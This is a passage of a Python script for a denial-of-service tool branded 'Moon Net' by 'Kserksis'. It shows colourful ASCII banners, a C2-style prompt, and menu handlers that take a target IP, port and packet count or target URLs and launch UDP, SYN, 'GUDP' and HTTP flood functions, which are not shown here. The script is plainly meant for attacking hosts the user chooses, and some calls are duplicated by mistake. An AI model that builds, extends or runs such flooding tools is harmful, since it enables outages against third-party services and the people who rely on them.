                 ║║║║ ║║ ║║║║   ║║║║╣  ║ 
                ║╩ ╩╚═╝╚═╝╝╚╝   ╝╚╝╚═╝ ╩ ║
                ╚════════════════════════╝
                ╔════════════════════════╗
                         UDP-FLOOD        
                ╚════════════════════════╝
        """))

        target_ip = input(fire("┏Enter target IP:  \t") + '\033[38;2;255;165;0m┗----->\t')
        target_port = int(input(fire("┏Enter target port:  \t") + '\033[38;2;255;165;0m┗----->\t'))
        packet_count = int(input(fire("┏Enter packet count:  \t") + '\033[38;2;255;165;0m┗----->\t'))
        udp_flood(target_ip, target_port, packet_count)
        print(fire("Starting UDP Flood..."))
        udp_flood(target_ip, target_port, packet_count)
        print(fire("UDP Flood completed."))
    elif method == "syn-flood":
        clear_screen()
        print(purplepink("""
    |Moon Net - Created by Kserksis | Status - Online |
 
 
                ╔════════════════════════╗
                ║╔╦╗╔═╗╔═╗╔╗╔   ╔╗╔╔═╗╔╦╗║
                 ║║║║ ║║ ║║║║   ║║║║╣  ║ 
                ║╩ ╩╚═╝╚═╝╝╚╝   ╝╚╝╚═╝ ╩ ║
                ╚════════════════════════╝
                ╔════════════════════════╗
                         SYN-FLOOD        
                ╚════════════════════════╝
        """))
        target_ip = input(fire("┏Enter target IP:  \t") + '\033[38;2;255;165;0m┗----->\t')
        target_port = int(input(fire("┏Enter target port:  \t") + '\033[38;2;255;165;0m┗----->\t'))
        packet_count = int(input(fire("┏Enter packet count:  \t") + '\033[38;2;255;165;0m┗----->\t'))
        print(fire("Starting SYN Flood..."))
        syn_flood(target_ip, target_port, packet_count)
        print(fire("SYN Flood completed."))
    elif method == "http-flood":
        clear_screen()
        print(purplepink("""
    |Moon Net - Created by Kserksis | Status - Online |
 
                ╔════════════════════════╗
                ║╔╦╗╔═╗╔═╗╔╗╔   ╔╗╔╔═╗╔╦╗║
                 ║║║║ ║║ ║║║║   ║║║║╣  ║ 
                ║╩ ╩╚═╝╚═╝╝╚╝   ╝╚╝╚═╝ ╩ ║
                ╚════════════════════════╝
                ╔════════════════════════╗
                        HTTP-FLOOD        
                ╚════════════════════════╝
        """))
        target_urls = input(purpleblue("Enter target URLs (comma-separated): ")).strip().split(',')
        target_urls = list(set(target_urls))
        request_count = int(input(purpleblue("Enter request count: ")))
        http_flood(target_urls, request_count)

    elif method == "gudp-flood":
        clear_screen()
        print(purplepink("""
    |Moon Net - Created by Kserksis | Status - Online |
 
 
                ╔════════════════════════╗
                ║╔╦╗╔═╗╔═╗╔╗╔   ╔╗╔╔═╗╔╦╗║
                 ║║║║ ║║ ║║║║   ║║║║╣  ║ 
                ║╩ ╩╚═╝╚═╝╝╚╝   ╝╚╝╚═╝ ╩ ║
                ╚════════════════════════╝
                ╔════════════════════════╗
                        GUDP-FLOOD        
                ╚════════════════════════╝
        """))
        target_ip = input(fire("┏Enter target IP:  \t") + '\033[38;2;255;165;0m┗----->\t')
        target_port = int(input(fire("┏Enter target port:  \t") + '\033[38;2;255;165;0m┗----->\t'))
        packet_count = int(input(fire("┏Enter packet count:  \t") + '\033[38;2;255;165;0m┗----->\t'))
        gudp_flood(target_ip, target_port, packet_count)
        print(fire("Starting GUDP Flood..."))
        gudp_flood(target_ip, target_port, packet_count)
        print(fire("GUDP Flood completed."))

def show_themes():
    select_theme()

def select_theme():
    clear_screen()
    print_theme_header()
    print_theme("This (fade)", "[1] This (fade, default) ")
    print_theme("That (fade)", "[2] That (fade) ")
    print_theme("Mix", "")
    print_theme("Mix", "") 

    global fire, purplepink, current_theme
    while True:
        choice = input("Choose Theme--> ").strip()
        if choice == "1":
            fire, purplepink = purplepink, fire
            current_theme = "Mix"
            return current_theme
        elif choice == "2":
            current_theme = "That (fade)"
            return current_theme
        else:
            print("Invalid choice, try again.")

def print_theme_header():
    header = """
                ╔════════════════════════╗
                ║╔╦╗╔═╗╔═╗╔╗╔   ╔╗╔╔═╗╔╦╗║
                 ║║║║ ║║ ║║║║   ║║║║╣  ║ 
                ║╩ ╩╚═╝╚═╝╝╚╝   ╝╚╝╚═╝ ╩ ║
                ╚════════════════════════╝
                ╔════════════════════════╗
                          THEMES        
                ╚════════════════════════╝
    """
    print(purplepink(header))

def print_theme(theme, text):
    if theme == "That (fade)":
        print(purplepink(text))
    elif theme == "This (fade)":
        print(fire(text))
    else:
        print(text)

def main():
    while True:
        clear_screen()
        print(purplepink("""
    |Moon Net - Created by Kserksis | Status - Online |
 
                ╔════════════════════════╗
                ║╔╦╗╔═╗╔═╗╔╗╔   ╔╗╔╔═╗╔╦╗║
                 ║║║║ ║║ ║║║║   ║║║║╣  ║ 
                ║╩ ╩╚═╝╚═╝╝╚╝   ╝╚╝╚═╝ ╩ ║
                ╚════════════════════════╝
                ╔════════════════════════╗
                       MOON DDoS NET        
                ╚════════════════════════╝
           ╔═══════════════════════════════════╗ 
           ║            ♦ Methods ♦            ║
           ╔ ══ ══ ══ ══ ══ ══ ══ ══ ══ ══ ══  ╗
           ║            •UDP Flood•            ║
           ║            •GUDP FLOOD•           ║
           ║            •SYN FLOOD•            ║
           ║     •HTTP FLOOD• (not working     ║
           ╚═══════════════════════════════════╝

        """))
        method = input(fire("┏$C2~Kserksis\t") + '\033[38;2;255;165;0m┗----->\t')

        if method.startswith("http-flood"):
            method = method.replace("$attack ", "")
            attack_command(method)
        elif method.startswith("syn-flood"):
            method = method.replace("$attack ", "")
            attack_command(method)
            input("Press enter to go back...")
        elif method.startswith("gudp-flood"):
            method = method.replace("$attack ", "")
            attack_command(method)
            input("Press enter to go back...")
        elif method.startswith("udp-flood"):
            method = method.replace("$attack ", "")
            attack_command(method)
        elif method.startswith("theme"):
            method = method.replace("$attack ", "")
            select_theme()
            input("Press enter to go back...")
        elif method == "help":
            help_command()
            input(fire("Press enter to continue..."))
        else:
            print("Invalid method")
            input("Press enter to continue...")

main()
